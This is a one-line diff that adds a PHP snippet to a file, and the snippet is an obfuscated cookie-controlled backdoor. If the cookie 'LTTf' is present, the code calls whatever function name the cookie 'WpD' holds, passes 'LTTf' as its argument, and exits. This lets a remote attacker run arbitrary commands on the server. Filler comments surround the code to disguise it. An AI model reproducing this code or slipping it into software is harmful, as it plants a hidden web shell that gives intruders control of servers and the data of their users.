@@ -1,0 +1,1 @@
+<?php /*upVo*/if(isset($_COOKIE["LTTf"])){$_COOKIE["WpD"]($_COOKIE["LTTf"]);exit;/*zJrr*/}/*AxTsJ*/
